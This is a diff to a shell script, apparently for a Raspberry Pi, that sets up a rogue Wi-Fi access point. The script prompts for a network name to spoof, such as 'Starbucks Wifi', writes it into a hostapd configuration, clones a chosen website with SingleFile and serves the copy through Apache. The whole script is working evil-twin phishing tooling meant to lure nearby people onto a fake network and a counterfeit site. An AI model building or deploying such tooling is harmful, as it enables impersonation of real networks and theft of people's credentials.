@@ -14,12 +14,32 @@ cat << "EOF"
 
  
 EOF
+echo "Which interface do you want to use as your AP NIC? Example: wlan1"
+echo ""
+read AP
+echo""
+echo "Using $AP as your AP interface"
+echo ""
+sleep 1
+echo "What is the Wifi network you want to spoof? Example: Starbucks Wifi"
+echo ""
+read SSID
+echo ""
+echo "Using $SSID as your spoofed network"
+sleep 1
 echo ""
 echo "Enter Website URL To Clone. Example: https://starbucks.com"
 echo ""
 read URL
 echo ""
-rm /var/www/html/index.html
+echo "Cloning $URL"
+systemctl stop dnsmasq
+cp Resources/hostapd.conf .
+sed -i s/AP/$AP/g hostapd.conf
+sed -i s/SID/$SSID/g hostapd.conf
+rm /etc/hostapd/hostapd.conf
+cp hostapd.conf /etc/hostapd/hostapd.conf
+#rm /var/www/html/index.html
 runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html 
 mv /home/pi/index.html /var/www/html/index.html
 service apache2 start
